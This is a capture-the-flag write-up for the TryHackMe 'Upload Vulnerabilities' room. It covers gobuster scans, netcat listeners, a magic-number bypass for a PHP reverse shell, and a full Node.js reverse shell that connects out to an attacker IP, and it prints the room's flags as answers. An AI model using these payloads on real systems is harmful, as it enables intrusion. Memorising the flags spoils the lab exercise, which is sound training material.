# Upload Vulnerabilities

{% embed url="https://tryhackme.com/room/uploadvulns" %}
https://tryhackme.com/room/uploadvulns
{% endembed %}

## Task 4 Overwriting Existing Files

#### What is the name of the image file which can be overwritten?

![](<../../.gitbook/assets/Screenshot from 2022-04-16 12-55-22.png>)

{% hint style="success" %}
`mountains.jpg`
{% endhint %}

#### Overwrite the image. What is the flag you receive?

```bash
wget https://i.imgur.com/TIoA2DR.png
convert TIoA2DR.png mountains.jpg
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 13-07-30.png>)

{% hint style="success" %}
`THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}`
{% endhint %}

## Task 5 Remote Code Execution

#### Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?

```bash
gobuster dir -u http://shell.uploadvulns.thm \
             -w /usr/share/dirb/wordlists/common.txt -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 13-20-51.png>)

{% hint style="success" %}
/`resources`
{% endhint %}

#### Get either a web shell or a reverse shell on the machine. What's the flag in the /var/www/ directory of the server?

![](<../../.gitbook/assets/Screenshot from 2022-04-16 13-18-40.png>)

```bash
nc -nvlp 4444
cat /var/www/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 13-19-39.png>)

{% hint style="success" %}
`THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}`
{% endhint %}

## Task 6 Filtering

* _Extension Validation_
* _File Type Filtering_
  * _MIME validation_
  * _Magic Number validation_
* _File Length Filtering_
* _File Name Filtering_
* _File Content Filtering_

#### What is the traditionally predominant server-side scripting language?

{% hint style="success" %}
`php`
{% endhint %}

#### When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?

{% hint style="success" %}
`whitelist`
{% endhint %}

#### What MIME type would you expect to see when uploading a CSV file?

{% embed url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types" %}

{% hint style="success" %}
`text/csv`
{% endhint %}

## Task 7 Bypassing Client-Side Filtering

#### What is the flag in /var/www/?

```bash
gobuster dir -u http://java.uploadvulns.thm/ \
             -w /usr/share/dirb/wordlists/common.txt -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 13-57-27.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-16 13-59-29.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-00-45.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-01-17.png>)

```bash
nc -nvlp 4444
ls -lA /var/www
cat /var/www/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-02-37.png>)

{% hint style="success" %}
`THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}`
{% endhint %}

## Task 8 Bypassing Server-Side Filtering: File Extensions

#### What is the flag in /var/www/?

```bash
gobuster dir -u http://annex.uploadvulns.thm \
             -w /usr/share/dirb/wordlists/common.txt -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-12-49.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-16-28.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-17-14.png>)

{% hint style="success" %}
`THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}`
{% endhint %}

## Task 9 Bypassing Server-Side Filtering: Magic Numbers

#### Grab the flag from /var/www/

```bash
gobuster dir -u http://magic.uploadvulns.thm/ \
             -w /usr/share/dirb/wordlists/common.txt -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-23-19.png>)

```bash
sed -i '1i GIF89a' php-reverse-shell.gif.php
file php-reverse-shell.gif.php
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-28-37.png>)

```bash
nc -nvlp 4444
cat /var/www/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-31-15.png>)

{% hint style="success" %}
`THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}`
{% endhint %}

## Task 11 Challenge

#### Hack the machine and grab the flag from /var/www/

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-54-48.png>)

```bash
gobuster dir -u http://jewel.uploadvulns.thm \
             -w /usr/share/dirb/wordlists/common.txt -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-39-40.png>) ![](<../../.gitbook/assets/Screenshot from 2022-04-16 14-42-37.png>)

<mark style="color:red;">**NB: Do not try a magic number bypass directly.**</mark>

![](<../../.gitbook/assets/Screenshot from 2022-04-16 15-44-45.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-16 15-47-36.png>)

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.6.9.176", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

```bash
wc js-reverse-shell.jpg
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 15-52-48.png>)

```bash
gobuster dir -u http://jewel.uploadvulns.thm/content/ \
             -w UploadVulnsWordlist.txt -x jpg -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 15-51-47.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-16 15-55-22.png>)

```bash
nc -nvlp 4444
cat /var/www/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-16 15-55-43.png>)

{% hint style="success" %}
`THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}`
{% endhint %}

## Reference

{% embed url="https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints" %}
